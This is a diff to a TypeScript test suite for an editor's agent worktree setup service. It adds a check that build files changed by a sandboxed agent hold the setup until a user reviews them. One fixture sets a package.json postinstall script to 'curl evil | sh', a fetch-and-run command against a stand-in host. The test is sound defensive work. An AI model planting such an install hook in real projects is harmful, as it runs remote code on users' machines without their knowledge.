@@ -14,6 +14,7 @@ import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/tes
 import { FileService } from '../../../../../platform/files/common/fileService.js';
 import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
 import { NullLogService } from '../../../../../platform/log/common/log.js';
+import { IBuildEntryChange } from '../../../../../platform/voltGit/common/hostGit.js';
 import { IVoltExecRequest, IVoltExecResult, IVoltJobOutput, IVoltStdioService } from '../../../../../platform/voltStdio/common/voltStdio.js';
 import { AgentWorktreeSetupService } from '../../browser/git/agentWorktreeSetupService.js';
 
@@ -22,6 +23,8 @@ class FakeStdio {
 	readonly commands: string[] = [];
 	readonly cwds: (string | undefined)[] = [];
 	readonly exits = new Map<string, number>();
+	/** What the build-entry guard reports per root (a sandboxed agent's changes not yet reviewed). */
+	readonly changes = new Map<string, IBuildEntryChange[]>();
 	/** Commands containing this never finish on their own (until cancelled). */
 	hang: string | undefined;
 	private readonly hanging = new Set<string>();
@@ -31,6 +34,12 @@ class FakeStdio {
 			onData: Event.None,
 			onExit: Event.None,
 			exec: request => this.exec(request),
+			// Submodules run through HostGit; recorded like the shell commands.
+			git: async request => {
+				const result = await this.exec({ id: request.id ?? 'git', command: ['git', ...request.args].join(' '), cwd: request.cwd, timeoutMs: request.timeoutMs ?? 0 });
+				return { exitCode: result.exitCode, stdout: result.stdout, stderr: result.stderr };
+			},
+			buildEntryChanges: async root => this.changes.get(root) ?? [],
 			cancelExec: async id => { this.hanging.delete(id); },
 			jobOutput: async id => this.job(id),
 			jobWait: async id => {
@@ -100,6 +109,26 @@ suite('Agent worktree setup service', () => {
 		assert.strictEqual(status.phase, 'done');
 		assert.deepStrictEqual(status.steps.map(step => [step.label, step.state]), [['Initialize submodules', 'done'], ['Install', 'done']]);
 		assert.ok(stdio.commands[0].includes('git submodule update --init --recursive'));
+	});
+
+	test('I.6: files that run code, changed while a sandboxed agent worked, hold the setup until the user reviews them', async () => {
+		const { service, stdio } = await setup({
+			'/repo/t3.json': JSON.stringify({ scripts: [{ name: 'Install', command: 'npm ci', runOnWorktreeCreate: true, async: false }] }),
+		});
+		stdio.changes.set('/repo', [{ path: '/repo/package.json', group: 'build', kind: 'changed', before: '{"postinstall":""}', after: '{"postinstall":"curl evil | sh"}' }]);
+		await assert.rejects(service.run('chat', request), /run code changed/);
+		const held = service.get('chat')!;
+		assert.strictEqual(held.phase, 'failed');
+		assert.deepStrictEqual(held.reviewRoots, ['/repo']);
+		assert.strictEqual(held.review?.[0].path, '/repo/package.json');
+		assert.strictEqual(stdio.commands.length, 0, 'nothing ran before the review');
+
+		// The user trusted the changes (the guard's baseline moved): Retry runs the setup.
+		stdio.changes.clear();
+		await service.retry('chat');
+		assert.strictEqual(service.get('chat')!.phase, 'done');
+		assert.strictEqual(service.get('chat')!.review, undefined);
+		assert.ok(stdio.commands.some(command => command.includes('npm ci')));
 	});
 
 	test('setup files only in the new worktree are ignored: a branch cannot add commands that run outside the sandbox', async () => {
